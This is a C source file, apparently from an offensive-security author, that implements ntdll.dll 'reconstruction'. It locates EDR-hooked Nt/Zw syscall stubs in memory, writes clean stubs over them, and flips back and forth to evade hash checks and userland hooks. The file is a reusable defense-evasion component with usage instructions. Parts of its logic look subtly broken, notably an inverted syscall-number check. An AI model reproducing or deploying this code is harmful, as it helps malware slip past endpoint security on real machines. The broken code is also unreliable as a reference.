/*
** p4p1: http://leosmith.wtf/
** Created on: Thu 24 Sep 2026 01:53:35 PM CEST
** ntdll_reconstruction.c
** File description:
**  Read NTDLL.dll find hooked Nt/Zw functions create a clean stub, flip back
**  and fourth from clean/hooked syscall stubs to avoid EDR ntdll.dll hashes checks
**  and bypass userland hooks. More info on this technique here: https://leosmith.wtf/blog/ntdll_reconstruction.html
** Usage:
**  struct hook_cache	*cache = 0;
**
**  cache = ntdll_reconstruction_init();
**  if (cache == 0)
**    // Throw Error!
**  while (1) {
**    // Do whatever
**    cache = ntdll_reconstruction_flip(cache); // Back to hooked stub
**    if (cache == 0)
**      // Throw Error!
**    Sleep(1234);
**    cache = ntdll_reconstruction_flip(cache); // Back to clean stub
**    if (cache == 0)
**      // Throw Error!
**  }
*/

#include "ntdll_reconstruction.h"

static int					switch_memory_protection(void *memory, unsigned long long size, unsigned long long perm, DWORD *old)
{
	/*
	** This is the funciton you should edit with the technique you wan't to use for this example
	** I am using kernel32.dll but this is dumb for obvious reasons....
	**/
	if (!VirtualProtect(memory, size, perm, old))
		return				(0);
	return					(1);

/*	struct sk4r4b_syscall	*ssn_NtProtectVirtualMemory = 0;
	NTSTATUS				status = 0;

	ssn_NtProtectVirtualMemory = (struct sk4r4b_syscall *)sk4r4b_resolve(HASH_ntdll_dll, HASH_NtProtectVirtualMemory);
	if (ssn_NtProtectVirtualMemory == 0)
		return				(0);
	status = (NTSTATUS)sk4r4b_direct_syscall(ssn_NtProtectVirtualMemory->ssn, ull(5), ull(NtCurrentProcess()), &memory, &size, perm, old);
	if (status != 0)
		return				(0);
	return					(1);*/
}

/*static void				display_cache(struct hook_cache *cache)
{
	// A good to have debug printf function!
	struct hook_cache	*tmp = cache;
	int					level = 0;

	while (tmp) {
		printf("hook_cache: Level(%d) [ node: %p ] [ mem: %p ] [ ntdll_pos: %p ] [ next: %p ]\n", level, tmp, tmp->mem, tmp->ntdll_pos, tmp->next);
		printf("Content: %*S\n", level->mem, REPLACE_SIZE);
		tmp = tmp->next;
		level++;
	}
}*/

static void					*get_local_ntdll(void)
{
	PPEB					pPeb = (PPEB)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY	pLdr = 0;

	if (pPeb == 0)
		return				(0);
	pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
	if (pLdr == 0)
		return				(0);
	return					(pLdr->DllBase);
}

static int					is_hooked(unsigned char *memory)
{
	const char				opcodes[] = { 0x4c, 0x8b, 0xd1, 0xb8 };

	for (unsigned int i = 0; i < 0x20 && (memory[i] != 0xc3) && !(memory[i] == 0x0f && memory[i+1] == 0x05); i++) {
		if (ntdll_reconstruction_memcmp(memory + i, opcodes, 4) == 0 && memory[i + 6] == 0x00 && memory[i + 7] == 0x00) {
			return			(0);
		}
	}
	return					(1);
}

static int				find_ssn(unsigned char *memory, unsigned int depth)
{
	const char			opcodes[] = { 0x4c, 0x8b, 0xd1, 0xb8 };
	int					high = 0;
	int					low = 0;
	int					ret = -1;

	if (depth == NTDLL_RECONSTRUCTION_DEPTH)
		return			(-1);
	for (unsigned int i = 0; i < 0x20 && (memory[i] != 0xc3) && !(memory[i] == 0x0f && memory[i+1] == 0x05); i++) {
		if (ntdll_reconstruction_memcmp(memory + i, opcodes, 4) == 0 && memory[i + 6] == 0x00 && memory[i + 7] == 0x00) {
			low = memory[i + 4];
			high = memory[i + 5];
			return		((high << 8) | low);
		}
	}
	ret = find_ssn(memory + 0x20, depth + 1); // go up
	if (ret >= 0)
		return			(ret - 1);
	ret = find_ssn(memory - 0x20, depth + 1); // go down
	if (ret >= 0)
		return			(ret + 1);
	return				(-1);
}

struct hook_cache		*append_cache(struct hook_cache *cache, unsigned char *memory, int ssn)
{
	struct hook_cache	*self = ntdll_reconstruction_malloc(sizeof(struct hook_cache));
	struct hook_cache	*tmp = cache;
	unsigned char			stub[REPLACE_SIZE] = {
		0x4c, 0x8b, 0xd1,								// mov r10, rcx
		0xb8, (ssn & 0xFF), ((ssn >> 8) & 0xFF), 0x00, 0x00, // mov eax, ssn
		0x0f, 0x05,										/* syscall */
		0xc3											/* ret */
	};

	if (self == 0) {
		ntdll_reconstruction_clear_cache(cache);
		return			(0);
	}
	self->ntdll_pos = (void *)memory;
	self->mem = ntdll_reconstruction_malloc(REPLACE_SIZE);
	if (self->mem == 0) {
		ntdll_reconstruction_clear_cache(cache);
		ntdll_reconstruction_free(self);
		return			(0);
	}
	self->next = 0;
	for (unsigned int i = 0; i < REPLACE_SIZE; i++)
		self->mem[i] = stub[i];
	if (cache == 0)
		return			(self);
	while (tmp->next != 0)
		tmp = tmp->next;
	tmp->next = self;
	return				(cache);
}

struct hook_cache		*ntdll_reconstruction_init(void)
{
	void					*ntdll_ptr = 0;
	struct hook_cache		*flipped = 0;
	struct hook_cache		*cache = 0;
	IMAGE_DOS_HEADER		*dos = 0;
	IMAGE_NT_HEADERS		*nt = 0;
	IMAGE_EXPORT_DIRECTORY	*exports = 0;
	unsigned long			export_rva = 0;
	unsigned long			export_size = 0;
	unsigned long			*addr_of_functions = 0;
	unsigned long			*addr_of_names = 0;
	unsigned short			*addr_of_name_ordinals = 0;
	unsigned long			fn_rva = 0;
	unsigned short			ordinal = 0;
	char					*func_name = 0;
	void					*code_base = 0;
	unsigned long long		code_size = 0;
	DWORD					old_protection = 0;
	int						ssn = -1;

	ntdll_ptr = get_local_ntdll();
	if (ntdll_ptr == 0)
		return				(0);
	dos = (IMAGE_DOS_HEADER *)ntdll_ptr;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return				(0);
	nt = (IMAGE_NT_HEADERS *)((unsigned char *)ntdll_ptr + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return				(0);
	code_base = (void *)((unsigned char *)ntdll_ptr + nt->OptionalHeader.BaseOfCode);
	code_size = (unsigned long long)(nt->OptionalHeader.SizeOfCode);
	export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	if (export_rva == 0)
		return				(0);
	exports = (IMAGE_EXPORT_DIRECTORY *)((unsigned char *)ntdll_ptr + export_rva);
	addr_of_functions = (unsigned long *)((unsigned char *)ntdll_ptr + exports->AddressOfFunctions);
	addr_of_names = (unsigned long *)((unsigned char *)ntdll_ptr + exports->AddressOfNames);
	addr_of_name_ordinals = (unsigned short *)((unsigned char *)ntdll_ptr + exports->AddressOfNameOrdinals);
	for (unsigned int i = 0; i < exports->NumberOfNames; i++) {
		func_name = (unsigned char *)ntdll_ptr + addr_of_names[i];
		if ((func_name[0] == 'N' && func_name[1] == 't' && func_name[2] >= 'A' && func_name[2] <= 'Z') || (func_name[0] == 'Z' && func_name[1] == 'w' && func_name[2] >= 'A' && func_name[2] <= 'Z')) {
			ordinal = addr_of_name_ordinals[i];
			fn_rva  = addr_of_functions[ordinal];
			if ((fn_rva < export_rva || fn_rva >= export_rva + export_size) && is_hooked((unsigned char *)ntdll_ptr + fn_rva)) {
				ssn = find_ssn((unsigned char *)ntdll_ptr + fn_rva, 0);
				if (ssn > -1)
					continue;
				cache = append_cache(cache, (void *)((unsigned char *)ntdll_ptr + fn_rva), ssn);
			}
		}
	}
	flipped = ntdll_reconstruction_flip(cache);
	if (flipped == 0) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	return					(flipped);
}

struct hook_cache			*ntdll_reconstruction_flip(struct hook_cache *cache)
{
	void					*ntdll_ptr = 0;
	IMAGE_DOS_HEADER		*dos = 0;
	IMAGE_NT_HEADERS		*nt = 0;
	void					*code_base = 0;
	unsigned long long		code_size = 0;
	DWORD					old_protection = 0;
	struct hook_cache		*tmp = cache;
	unsigned char			*memory = 0;
	char					ch = 0;

	if (cache == 0)
		return				(0);
	ntdll_ptr = get_local_ntdll();
	if (ntdll_ptr == 0) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	dos = (IMAGE_DOS_HEADER *)ntdll_ptr;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	nt = (IMAGE_NT_HEADERS *)((unsigned char *)ntdll_ptr + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	code_base = (void *)((unsigned char *)ntdll_ptr + nt->OptionalHeader.BaseOfCode);
	code_size = (unsigned long long)(nt->OptionalHeader.SizeOfCode);
	if (!switch_memory_protection(code_base, code_size, PAGE_READWRITE, &old_protection)) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	while (tmp) {
		memory = (unsigned char *)tmp->ntdll_pos;
		if (memory == 0) {
			ntdll_reconstruction_clear_cache(cache);
			return				(0);
		}
		for (unsigned int i = 0; i < REPLACE_SIZE; i++) {
			ch = memory[i];
			memory[i] = tmp->mem[i];
			tmp->mem[i] = ch;
		}
		tmp = tmp->next;
	}
	if (!switch_memory_protection(code_base, code_size, old_protection, &old_protection)) {
		ntdll_reconstruction_clear_cache(cache);
		return				(0);
	}
	return				(cache);
}

void					ntdll_reconstruction_clear_cache(struct hook_cache *cache)
{
	struct hook_cache	*tmp;

	if (cache != 0) {
		while (cache) {
			tmp = cache->next;
			ntdll_reconstruction_free(cache->mem);
			ntdll_reconstruction_free(cache);
			cache = tmp;
		}
	}
}
